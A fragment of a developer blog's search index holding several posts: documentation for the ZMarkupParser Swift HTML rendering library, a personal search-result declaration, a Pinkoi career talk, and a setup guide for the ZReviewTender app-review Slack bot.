&lt;br/&gt;&lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; -&gt; &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/i&gt;&lt;/b&gt;&lt;i&gt;Italic&lt;/i&gt;&lt;Congratulation!&gt; -&gt; &lt;Congratulation!&gt; (treat as String) Support custom style specificatione.g. &lt;b&gt;&lt;/b&gt; -&gt; weight: .semibold &amp; underline: 1 Support custom HTML tag parsinge.g. Parse &lt;zhgchgli&gt;&lt;/zhgchgli&gt; into the desired style Includes architecture design to facilitate expansion of HTML Tag supportCurrently supports basic styles as well as ul/ol/li lists and hr divider rendering. Future expansions will allow quick support for other HTML Tags. Support extending style parsing from the style HTML AttributeHTML allows text styles to be specified via the style attribute. Similarly, this package also supports styles defined in the style attribute.e.g. &lt;b style=‚Äùfont-size: 20px‚Äù&gt;&lt;/b&gt; -&gt; bold + font size 20 px Support iOS/macOS Support HTML Color Name to UIColor/NSColor Test Coverage: 80%+ Supports parsing of &lt;img&gt; images, &lt;ul&gt; item lists, &lt;table&gt; tables, and other HTML tags. Higher Performance than NSAttributedString.DocumentType.html Performance AnalysisPerformance Benchmark Test Environment: 2022/M2/24GB Memory/macOS 13.2/XCode 14.1 X Axis: Number of HTML Characters Y-axis: Rendering Time (seconds) *Additionally, NSAttributedString.DocumentType.html will crash (EXC_BAD_ACCESS) with strings longer than 54,600+ characters.Try it outYou can directly download the project, open ZMarkupParser.xcworkspace, select the ZMarkupParser-Demo target, then build and run to test the functionality.InstallationSupports SPM/Cocoapods, please refer to Readme.How to UseStyle DeclarationMarkupStyle/MarkupStyleColor/MarkupStyleParagraphStyle are wrappers for NSAttributedString.Key.var font:MarkupStyleFontvar paragraphStyle:MarkupStyleParagraphStylevar foregroundColor:MarkupStyleColor? = nilvar backgroundColor:MarkupStyleColor? = nilvar ligature:NSNumber? = nilvar kern:NSNumber? = nilvar tracking:NSNumber? = nilvar strikethroughStyle:NSUnderlineStyle? = nilvar underlineStyle:NSUnderlineStyle? = nilvar strokeColor:MarkupStyleColor? = nilvar strokeWidth:NSNumber? = nilvar shadow:NSShadow? = nilvar textEffect:String? = nilvar attachment:NSTextAttachment? = nilvar link:URL? = nilvar baselineOffset:NSNumber? = nilvar underlineColor:MarkupStyleColor? = nilvar strikethroughColor:MarkupStyleColor? = nilvar obliqueness:NSNumber? = nilvar expansion:NSNumber? = nilvar writingDirection:NSNumber? = nilvar verticalGlyphForm:NSNumber? = nil...You can declare styles according to the HTML tags you want to apply them to:let myStyle = MarkupStyle(font: MarkupStyleFont(size: 13), backgroundColor: MarkupStyleColor(name: .aquamarine))HTML TagDeclare the HTML tags to render and their corresponding markup styles. The currently predefined HTML tag names are as follows:A_HTMLTagName(), // &lt;a&gt;&lt;/a&gt;B_HTMLTagName(), // &lt;b&gt;&lt;/b&gt;BR_HTMLTagName(), // &lt;br&gt;&lt;/br&gt;DIV_HTMLTagName(), // &lt;div&gt;&lt;/div&gt;HR_HTMLTagName(), // &lt;hr&gt;&lt;/hr&gt;I_HTMLTagName(), // &lt;i&gt;&lt;/i&gt;LI_HTMLTagName(), // &lt;li&gt;&lt;/li&gt;OL_HTMLTagName(), // &lt;ol&gt;&lt;/ol&gt;P_HTMLTagName(), // &lt;p&gt;&lt;/p&gt;SPAN_HTMLTagName(), // &lt;span&gt;&lt;/span&gt;STRONG_HTMLTagName(), // &lt;strong&gt;&lt;/strong&gt;U_HTMLTagName(), // &lt;u&gt;&lt;/u&gt;UL_HTMLTagName(), // &lt;ul&gt;&lt;/ul&gt;DEL_HTMLTagName(), // &lt;del&gt;&lt;/del&gt;IMG_HTMLTagName(handler: ZNSTextAttachmentHandler), // &lt;img&gt; and image downloaderTR_HTMLTagName(), // &lt;tr&gt;TD_HTMLTagName(), // &lt;td&gt;TH_HTMLTagName(), // &lt;th&gt;...and more...This way, when parsing the &lt;a&gt; tag, the specified MarkupStyle will be applied.Extend HTMLTagName:let zhgchgli = ExtendTagName(\"zhgchgli\")HTML Style AttributeAs mentioned earlier, HTML supports specifying styles via the Style Attribute. Here, we also abstract the supported styles and extensions. The currently predefined HTML Style Attributes are as follows:ColorHTMLTagStyleAttribute(), // colorBackgroundColorHTMLTagStyleAttribute(), // background-colorFontSizeHTMLTagStyleAttribute(), // font-sizeFontWeightHTMLTagStyleAttribute(), // font-weightLineHeightHTMLTagStyleAttribute(), // line-heightWordSpacingHTMLTagStyleAttribute(), // word-spacing...Extend Style Attribute:ExtendHTMLTagStyleAttribute(styleName: \"text-decoration\", render: { value in var newStyle = MarkupStyle() if value == \"underline\" { newStyle.underline = NSUnderlineStyle.single } else { // ... } return newStyle})Usageimport ZMarkupParserlet parser = ZHTMLParserBuilder.initWithDefault().set(rootStyle: MarkupStyle(font: MarkupStyleFont(size: 13))).build()initWithDefault automatically adds predefined HTML Tag Names, default corresponding MarkupStyles, and predefined Style Attributes.set(rootStyle:) can set the default style for the entire string, or it can be left unspecified.Customizationlet parser = ZHTMLParserBuilder.initWithDefault().add(ExtendTagName(\"zhgchgli\"), withCustomStyle: MarkupStyle(backgroundColor: MarkupStyleColor(name: .aquamarine))).build() // will use the markup style you specify to render the extended HTML tag &lt;zhgchgli&gt;&lt;/zhgchgli&gt;let parser = ZHTMLParserBuilder.initWithDefault().add(B_HTMLTagName(), withCustomStyle: MarkupStyle(font: MarkupStyleFont(size: 18, weight: .style(.semibold)))).build() // will use the markup style you specify to render &lt;b&gt;&lt;/b&gt; instead of the default bold markup styleHTML Renderlet attributedString = parser.render(htmlString) // NSAttributedString// work with UITextViewtextView.setHtmlString(htmlString)// work with UILabellabel.setHtmlString(htmlString)HTML Stripperparser.stripper(htmlString)Selector HTML Stringlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;selector.first(\"a\")?.first(\"b\").attributedString // will return Testselector.filter(\"a\").attributedString // will return Test Link// render from selector resultlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;parser.render(selector.first(\"a\")?.first(\"b\"))AsyncAdditionally, if rendering long strings, you can use async methods to prevent UI blocking.parser.render(String) { _ in }...parser.stripper(String) { _ in }...parser.selector(String) { _ in }...Know-how The hyperlink style in UITextView depends on linkTextAttributes, so there may be cases where NSAttributedString.Key is set but has no visible effect. UILabel does not support specifying URL styles, so NSAttributedString.key may be set but have no visible effect. If you need to render complex HTML, you still need to use WKWebView (including JS/tables rendering). Technical Principles and Development Story: ‚ÄúThe Story of Manually Building an HTML Parser‚ÄùWelcome Contributions and Issue Reporting for Prompt FixesIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Âá∫ÁèæËàáÊú¨‰∫∫Êùé‰ª≤ÊæÑÁÑ°Èóú‰πãÊêúÂ∞ãÁµêÊûúËÅ≤Êòé", "url": "/posts/zrealm-life/google-%E5%87%BA%E7%8F%BE%E8%88%87%E6%9C%AC%E4%BA%BA%E6%9D%8E%E4%BB%B2%E6%BE%84%E7%84%A1%E9%97%9C%E4%B9%8B%E6%90%9C%E5%B0%8B%E7%B5%90%E6%9E%9C%E8%81%B2%E6%98%8E-declaration-for-google-search-result/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, ÁîüÊ¥ª, medium", "date": "2023-01-09 08:00:00 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇËÅ≤Êòé #1: ÊäÄËóùÂ∞àÈ°å„ÄëÂØ´Á®ãÂºèÊàêÂÖ®Ê∞ëÈÅãÂãïÔºÅÂ∞àË®™Á∂≤È†ÅË®≠Ë®àÈáëÁâåÊùé‰ª≤ÊæÑ #2: „ÄêÊäÄËóùÂ∞àÈ°å„Äë‰∫∫ÊâçÂüπÈ§äÂÅöÂçäÂ•óÔºåÊäÄÂÑ™ÁîüÂèçÊàêÂõõ‰∏çÂÉèËÅ≤Êòé‰∫∫ÔºöÊùé‰ª≤ÊæÑËÅ≤ÊòéÊó•ÊúüÔºö2023/01/09ËÅØÁπ´ÊñπÂºèÔºözhgchgli@gmail.com(Âõ†‰∏çÊÉ≥Â¢ûÂä† Google Â∞çÁÑ°ÈóúÁöÑÊÉ°ÊÑèÂ≠óË©ûÊî∂ÈåÑÔºåÊïÖ‰ΩøÁî®ÂúñÁâáÂÅöÁÇ∫ËÅ≤ÊòéÊñá‰ª∂) üîó Copy link to ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇËÅ≤Êòé #1: ÊäÄËóùÂ∞àÈ°å„ÄëÂØ´Á®ãÂºèÊàêÂÖ®Ê∞ëÈÅãÂãïÔºÅÂ∞àË®™Á∂≤È†ÅË®≠Ë®àÈáëÁâåÊùé‰ª≤ÊæÑ #2: „ÄêÊäÄËóùÂ∞àÈ°å„Äë‰∫∫ÊâçÂüπÈ§äÂÅöÂçäÂ•óÔºåÊäÄÂÑ™ÁîüÂèçÊàêÂõõ‰∏çÂÉèËÅ≤Êòé‰∫∫ÔºöÊùé‰ª≤ÊæÑËÅ≤ÊòéÊó•ÊúüÔºö2023/01/09ËÅØÁπ´ÊñπÂºèÔºözhgchgli@gmail.com(Âõ†‰∏çÊÉ≥Â¢ûÂä† Google Â∞çÁÑ°ÈóúÁöÑÊÉ°ÊÑèÂ≠óË©ûÊî∂ÈåÑÔºåÊïÖ‰ΩøÁî®ÂúñÁâáÂÅöÁÇ∫ËÅ≤ÊòéÊñá‰ª∂) üîó Copy link to share! üç∫ Buy me a beer on PayPal Improve this page on Github." }, { "title": "Pinkoi Open HouseÔΩú15-Min Career Talks for Gen Z Developers", "url": "/posts/zrealm-dev/pinkoi-open-house-15-min-career-talks-for-gen-z-developers-4b9d09cea5f0/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, pinkoi, open-house, tech-career, career-advice", "date": "2022-12-02 16:11:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Pinkoi 2022 Open House for GenZ ‚Äî 15 Mins Career TalkPinkoi Developers‚Äô Night ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Pinkoi 2022 Open House for GenZ ‚Äî 15 Mins Career TalkPinkoi Developers‚Äô Night 2022 Year-End Networking Event ‚Äî 15-Minute Career Sharing TalkPinkoi Developers‚Äô Night 2022 Year-End MeetupEvent link: LinkedinPrimary Audience: Students majoring in information-related fields at universities and collegesLocation and Time: 2022/12/01 7:00 PM ‚Äî 9:00 PMSharing Duration: 15 minsAbout MeCurrently serving as Pinkoi Platform (App) Engineer Lead and iOS Engineer. Previously worked at StreetVoice, Addcn Technology (listed 5287), and a startup company. Self-taught web programming since vocational high school. Won the championship and was a backup national team member in the National Skills Competition for web design. Graduated from the Department of Information Management at National Taiwan University of Science and Technology. Transitioned to iOS app development in 2017.Passionate about exploration and tech sharing, I also write about daily life and unboxing experiences. Feel free to follow my Medium Blog.Pinkoi Engineer Daily ‚Äî ProductPinkoi products support four platforms: desktop, mobile, iOS, and Android, as well as six languages: Traditional Chinese, Hong Kong Traditional Chinese, Simplified Chinese, Japanese, Thai, and English.Behind the scenes, there are more than 8 squads responsible for different areas, such as the Buyer Squad handling the buyer side, the Seller Squad managing the seller side, the Platform Squad in charge of the infrastructure, the AI Squad focusing on algorithms, and so on, all working together to build the Pinkoi product.Pinkoi Engineer Daily ‚Äî ToolsPlease note: This chart does not represent a complete or up-to-date Tech Stack.To do a good job, one must first sharpen one‚Äôs tools. The above image lists Pinkoi‚Äôs development team‚Äôs tech stack and the tools and services they use. It also includes cross-team collaboration tools like Slack, Asana, Figma, and others.As the team size grows, there will be more instances requiring communication or repetitive tasks. Introducing tools and services can effectively ease human connections and boost team productivity.Pinkoi Engineer Daily ‚Äî The Behind-the-Scenes ‚ÄúContributor‚ÄùAt Pinkoi, although engineers are assigned to different Squad Teams, they still work together with one heart. Win as a team, we are all still one family.Pinkoi Engineer Daily ‚Äî Behind-the-Scenes ‚ÄúContributors‚ÄùTeammates with the same role (e.g., iOS/Android/BE/FE/Data‚Ä¶) not only hold regular technical exchange sessions but also conduct mutual code reviews and system design discussions during daily development. They discuss together and grow together!The ‚ÄúObedient‚Äù tattoo sticker in the middle of the above image is part of the team‚Äôs Gift List feature launch and the 2022 Pinkoi Design Fest event‚Äôs blessing ceremony, ensuring the service remains safe and stable.How Can Engineers Help Advance Business Goals?Besides completing tasks, engineers have many ways to help advance business goals:First, set aside the constraints of the Engineer role and start from your own perspective; during project planning, you can share your personal experiences and creative ideas. For example, you might notice friends‚Äô usage habits or new trendy cool features (e.g., iOS 16 Dynamic Island). By brainstorming together, a seemingly ordinary feature might turn into a brand-new highlight!Next, returning to the engineering itself, the first essential is strong development skills. Good development skills ensure scalability and stability, reduce technical debt, lower future maintenance costs, and indirectly increase business value. Similarly, the right technology choices can maximize value with limited development resources. All of these require solid hard skills and accumulated experience.Besides, leveraging communication and coordination skills can make cross-engineering discussions more efficient, and applying collaboration skills can reduce rework; both greatly increase team output and further advance business goals.In summary, engineers can definitely create value through more than just coding.How Can Engineers Help Advance Business Goals?At Pinkoi, the Squad Team‚Äôs sync-up or project meetings include not only engineers but also designers, PMs, and analysts, all participating in project discussions; everyone can share their ideas, sparking diverse insights.As an Engineer, why choose to join a startup culture instead of a traditional large company‚Ä¶?Personal experience: The startup culture (also on Pinkoi) has five characteristics: TransparencyEveryone can clearly understand the company‚Äôs operations, decisions, and future plans. EqualityFlat management with no hierarchical pressureEveryone can express opinions and participate in discussions regardless of position VisionGrow alongside the team, from a small group to an international team, broadening perspectivesCombine transparency and equality to understand more detailed aspects from various angles Flexibility Flexibility at work:There is ample room for flexible discussions regarding working hours, WFH, and communication collaboration. Flexibility in roles:More opportunities to try different possibilities.Greater flexibility in career advancement. ActiveThe average age is relatively young and energetic, making it easier to resonate, spark ideas, and drive or accept change.These features were less common in traditional large companies, which tend to be more closed and rigid. There is little room for suggestions, limited tasks to see and do, and resistance to new changes. This makes it harder for energetic newcomers to thrive.Some Advice for Fresh Graduates Aspiring to Be Software Engineers‚Ä¶Engineer at 28 vs. Engineer at 46 (Elon Musk was once an engineer too); although it‚Äôs a meme, the point is that what kind of engineer you become is up to you.Some Advice for Fresh Graduates Who Want to Be Software Engineers‚Ä¶Besides lean development skills, I believe mindset is even more important. Life is a journey with many stages and roles to fulfill. The first is to constantly step out of your comfort zone and be ready to face greater challenges. For example, I started as a backend engineer, then switched to iOS development, and now I am beginning to take on management roles.Second is exploring directions without limiting yourself. Everyone has unlimited potential and can continuously adjust to find the right path to shine in their strengths. Some of our teammates switched careers to engineering later or moved from designer to PM. You can also think about what role you want to be at 30 or 40, such as continuing to deepen technical skills to become an architect/Tech Lead or shifting to a management position.There is also lifelong learning; knowledge has no limits. Especially in the IT industry, which is constantly changing, without seeking innovation and adaptation, it is easy to be left behind.The last point is also very important: maintain a work-life balance. Work Hard, Play Hard not only boosts work efficiency but also allows you to draw inspiration from life experiences. As mentioned earlier, a small idea might change the world and create greater business value!It is recommended for fresh graduates to carefully choose their first few jobs. The opportunity cost is low when just starting out; prioritize finding a job where you can learn. Try to join companies that create their own products (e.g., Pinkoi, Line, StreetVoice‚Ä¶) and avoid changing positions too frequently (stay at least one year). This will greatly benefit your future career. Life is still long, and I hope everyone finds their own path. Thank you.Join Pinkoi now¬†¬ª&gt; https://www.pinkoi.com/about/careersHighlightsIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "App Reviews Monitoring RobotÔΩúZReviewTender‚ÄîFree Open Source Tool for Real-Time Feedback", "url": "/posts/zrealm-dev/app-reviews-monitoring-robot-zreviewtender-free-open-source-tool-for-real-time-feedback-e36e48bb9265/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, app-store, google-play, app-review, automation", "date": "2022-08-10 19:56:05 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZReviewTender ‚Äî Free Open-Source App Reviews Monitoring BotReal-time monitorin...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZReviewTender ‚Äî Free Open-Source App Reviews Monitoring BotReal-time monitoring of the app‚Äôs latest review content and providing instant feedback to improve collaboration efficiency and customer satisfactionZhgChgLi / ZReviewTenderZhgChgLi / ZReviewTenderApp Reviews to Slack ChannelZReviewTender ‚Äî Automatically monitors the latest user reviews for App Store iOS/macOS apps and Google Play Android apps, and provides continuous integration tools to connect with team workflows, improving collaboration efficiency and customer satisfaction.Features Obtain the review list of iOS/macOS apps from the App Store and Android apps from Google Play, then filter out the latest reviews that have not been crawled yet. [Default Feature] Forward the latest crawled reviews to Slack. Clicking the message Timestamp link allows quick access to the backend to reply to reviews. [Default Feature] Supports using Google Translate API to automatically translate reviews in languages or regions other than the specified one into your language [Default Feature] Supports automatic logging of reviews to Google Sheet Supports flexible expansion. Besides the included default features, you can develop and integrate additional functionalities according to your team‚Äôs workflow.e.g. Forward reviews to Discord, Line, Telegram‚Ä¶ Use timestamps to record crawl locations and prevent duplicate review scraping Supports filtering features, allowing you to specify crawling only reviews with certain ratings, containing specific keywords, or from particular regions/languages. Apple, based on the new App Store Connect API, provides a stable and reliable source for App Store app review data, unlike before when using XML data was unreliable or Fastlane Spaceship sessions expired and required regular manual maintenance. Android also uses the official AndroidpublisherV3 API to fetch review data Support deploying with Github Repo w/ Github Action, allowing you to quickly and freely create the ZReviewTender App Reviews bot 100% Ruby @ RubyGem TL;DR [2024/09/27] Update Organized quick deployment tutorial, please refer to the latest article: [Quick Start!] Github Action x ZReviewTender Free Fast Deployment of Your App Store Review Monitoring Bot.Comparison with Similar ServicesApp Reviews Workflow Integration Example (in Pinkoi)Question:Product reviews in online stores are very important, but they involve a lot of manual and repetitive referral communication.Because I need to manually check for new reviews from time to time, and if there are customer service issues, forward them to the support team for assistance, it becomes repetitive and manual.Using the ZReviewTender review bot, reviews are automatically forwarded to the Slack Channel, allowing everyone to quickly receive the latest review information and track and discuss it in real time. It also helps the entire team understand current user feedback and suggestions for the product.For more information, please refer to: 2021 Pinkoi Tech Career Talk ‚Äî Secrets of a High-Efficiency Engineering Team .Deployment ‚Äî Using Only Default FeaturesIf you only need the default features of ZReviewTender (to Slack/Google Translate/Filter), you can use the following quick deployment method.ZReviewTender has been packaged and released on RubyGems, allowing you to quickly and easily install and use ZReviewTender via RubyGems.[Recommendation] Deploy Directly Using Github Repo Template No hosting space required ‚úÖ No environment requirements needed ‚úÖ No need to understand engineering principles ‚úÖ Complete the Config file setup to finish the deployment ‚úÖ Complete deployment in 8 steps ‚úÖ Completely Free ‚úÖGitHub Actions provides over 2,000 minutes of runtime per account each month. Running the ZReviewTender evaluation retrieval takes about 15 to 30 seconds each time.By default, it runs every 6 hours, four times a day, using only about 60 minutes of your quota per month.GitHub Private Repositories can be created for free without any limits. Go to the ZReviewTender Template Repo: ZReviewTender-deploy-with-github-actionClick the ‚ÄúUse this template‚Äù button at the top right. Create Repo Repository name: Enter the desired Repo project name Access: Private ‚ö†Ô∏è‚ö†Ô∏è Please make sure to create a Private Repo ‚ö†Ô∏è‚ö†Ô∏è Because you will upload the configuration and private key to the projectFinally, click the ‚ÄúCreate repository from template‚Äù button below. Confirm that the Repo you created is a Private RepoConfirm that the repo name in the top right shows the ‚Äúüîí‚Äù icon and the Private label.If not, it means the repository you created is a Public Repo and very risky. Please go to the top tab ‚ÄúSettings‚Äù -&gt; ‚ÄúGeneral‚Äù -&gt; bottom ‚ÄúDanger Zone‚Äù -&gt; ‚ÄúChange repository visibility‚Äù -&gt; ‚ÄúMake private‚Äù to change it back to a Private Repo. Wait for the Project init to succeedCan be found in the Repo homepage Readme underCheck the block for the Badge; if it shows passing, it means the init was successful.Or click the top tab ‚ÄúActions‚Äù -&gt; wait for the ‚ÄúInit ZReviewTender‚Äù Workflow to complete:Execution status will change to 3 ‚Äú‚úÖ Init ZReviewTender‚Äù -&gt; Project init successful. Verify that the init files and directories are correctly createdClick the ‚ÄúCode‚Äù tab above to return to the project directory. If the project initialization is successful, you will see: Table of Contents: config/ File: config/android.yml File: config/apple.yml Table of Contents: latestCheckTimestamp/ File: latestCheckTimestamp/.keep Complete Configuration by setting up android.yml &amp; apple.ymlEnter the config/ directory to complete the configuration of the android.yml and apple.yml files.Click to open the confi YML file you want to edit, then click the ‚Äú‚úèÔ∏è‚Äù icon at the top right to edit the file.Refer to the ‚ÄúSettings‚Äù section below to complete the configuration of android.yml &amp; apple.yml.After editing, you can directly save the settings by clicking ‚ÄúCommit changes‚Äù below.Upload the corresponding Key file to the config/ directory:In the config/ directory, click ‚ÄúAdd file‚Äù in the top right corner -&gt; ‚ÄúUpload files‚ÄùUpload the corresponding keys configured in the config yml and the external file paths together to the config/ directory. Drag the files to the ‚Äúupper section‚Äù -&gt; wait for the files to finish uploading -&gt; then directly ‚ÄúCommit changes‚Äù below to save.After uploading, go back to the /config directory to check if the files are correctly saved and uploaded. Initialize ZReviewTender (manually trigger once)Click the top tab ‚ÄúActions‚Äù -&gt; select ‚ÄúZReviewTender‚Äù on the left -&gt; click the ‚ÄúRun workflow‚Äù button on the right -&gt; click the ‚ÄúRun workflow‚Äù button to execute ZReviewTender once.After clicking, refreshing the webpage will display:Click ‚ÄúZReviewTender‚Äù to view the execution status.Expand the Run ZreviewTender -r block to view the execution log.Here you can see an Error because I haven‚Äôt set up my config yml file yet.After adjusting the android/apple config yml, go back to step 6 and trigger the execution again from the beginning.Check the log in the „Äå ZReviewTender -r „Äç section to confirm successful execution!The Slack channel designated to receive the latest review messages will also display the ‚Äúinit Success‚Äù success message üéâ Done! üéâ üéâ üéâSetup complete! Every 6 hours, the latest reviews from the period will be automatically fetched and forwarded to your Slack Channel!You can check the latest execution status at the top of the Readme on the Repo homepage:If an Error occurs, it means the execution failed. Please go to Actions -&gt; ZReviewTender to check the logs; if there is an unexpected error, please create an Issue and attach the log information. It will be fixed as soon as possible! ‚ùå‚ùå‚ùå Errors during execution will also trigger email notifications from Github, so you don‚Äôt have to worry about the bot crashing without anyone noticing!Github Action AdjustmentsYou can also configure the Github Action execution rules according to your needs.Click the top tab ‚ÄúActions‚Äù -&gt; left side ‚ÄúZReviewTender‚Äù -&gt; top right ‚ÄúZReviewTender.yml‚ÄùClick the ‚Äú‚úèÔ∏è‚Äù icon at the top right to edit the file.There are two parameters available for adjustment:cron: Set how often to check for new reviews. The default is 15 */6 * * *, which means it runs every 6 hours at 15 minutes past the hour.You can refer to crontab.guru to configure according to your needs. Please Note: Github Actions uses the UTC time zone Higher execution frequency consumes more GitHub Action minutes. run : Set the command to execute. Refer to the ‚ÄúExecution‚Äù section below. The default is ZReviewTender -r Default execution for Android App &amp; Apple (iOS/macOS App): ZReviewTender -r Only run Android App: ZReviewTender -g Only run Apple (iOS/macOS App) App: ZReviewTender -a After editing, click ‚ÄúStart commit‚Äù at the top right and select ‚ÄúCommit changes‚Äù to save the settings.Manually Trigger ZReviewTender ExecutionRefer to the previous section ‚Äú6. Initialize ZReviewTender (manually trigger once)‚ÄùInstalling with GemIf you are familiar with Gems, you can install ZReviewTender directly using the following command:gem install ZReviewTenderInstalling with Gem (For those unfamiliar with Ruby/Gems)If you are not familiar with Ruby or Gems, you can follow the steps below to install ZReviewTender step by step. Although macOS comes with Ruby pre-installed, it is recommended to use rbenv or rvm to install and manage Ruby versions (I use 2.6.5). Use rbenv or rvm to install Ruby 2.6.5, and switch to Ruby managed by rbenv/rvm. Use which ruby to confirm the current Ruby in use is not the system Ruby at /usr/bin/ruby. After setting up the Ruby environment, use the following command to install ZReviewTender. gem install ZReviewTenderDeployment ‚Äî Want to Expand Features YourselfManual git clone ZReviewTender Source Code Confirm &amp; Improve Ruby Environment Go to the directory and run bundle install to install dependencies for ZReviewTender. The processor setup method can be referred to in the following article content.SettingsZReviewTender ‚Äî Use a YAML file to configure Apple/Google review bots.[Recommendation] Use the execution command below the article directly ‚Äî ‚ÄúGenerate Configuration File‚Äù:ZReviewTender -iDirectly generate blank apple.yml &amp; android.yml configuration files.Apple (iOS/macOS App)Reference the apple.example.yml file: ‚ö†Ô∏è After downloading apple.example.yml, remember to rename the file to apple.ymlapple.yml:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: '' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: '' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: '' # APPLE STORE CONNECT ISSUE IDappID: '' # APP ID...appStoreConnectIssueID: App Store Connect -&gt; Keys -&gt; App Store Connect API Issuer ID: appStoreConnectIssueID appStoreConnectP8PrivateKeyID &amp; appStoreConnectP8PrivateKeyFilePath: Name: ZReviewTender Access: App Manager appStoreConnectP8PrivateKeyID: Key ID appStoreConnectP8PrivateKeyFilePath: /AuthKey_XXXXXXXXXX.p8, download the API Key and place the file in the same directory as the config yml. appID:appID: App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; Apple IDGCP Service AccountZReviewTender uses Google API services (fetching store reviews, Google Translate, Google Sheets) with Service Account authentication.You can first follow the official steps to create GCP &amp; Service Account to download and save the GCP Service Account credentials key (*.json). To use the automatic translation feature, please ensure that GCP has enabled the Cloud Translation API and that the Service Account in use has the necessary permissions. To use the feature that records data to Google Sheets, please ensure that the GCP has enabled the Google Sheets API and Google Drive API, and that the Service Account used has been added as well. Google Play Console (Android App)Reference the android.example.yml file: ‚ö†Ô∏è After downloading android.example.yml, remember to rename the file to android.ymlandroid.yml:platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App ID......packageName:packageName: com.XXXXX can be found in Google Play Console -&gt; Dashboard -&gt; AppplayConsoleDeveloperAccountID &amp; playConsoleAppID:Can be obtained from the Google Play Console -&gt; Dashboard -&gt; App page URL:https://play.google.com/console/developers/ playConsoleDeveloperAccountID /app/ playConsoleAppID /app-dashboardUsed to generate a combined review message link, allowing the team to quickly access the backend review reply page by clicking the link.keyFilePath:The most important information, GCP Service Account identity permission key (*.json)Follow the steps in the official documentation to create a Google Cloud Project &amp; Service Account. Then, go to Google Play Console -&gt; Setup -&gt; API Access to enable the Google Play Android Developer API and link the project. Finally, download the service account JSON key from GCP.Example JSON Key Content:gcp_key.json:{ \"type\": \"service_account\", \"project_id\": \"XXXX\", \"private_key_id\": \"XXXX\", \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nXXXX\\n-----END PRIVATE KEY-----\\n\", \"client_email\": \"XXXX@XXXX.iam.gserviceaccount.com\", \"client_id\": \"XXXX\", \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\", \"token_uri\": \"https://oauth2.googleapis.com/token\", \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\", \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/XXXX.iam.gserviceaccount.com\"} keyFilePath: /gcp_key.json Key file path, place the file in the same directory as the config yml.Processorsprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: false # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory (language) that you don't want to translate. - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable 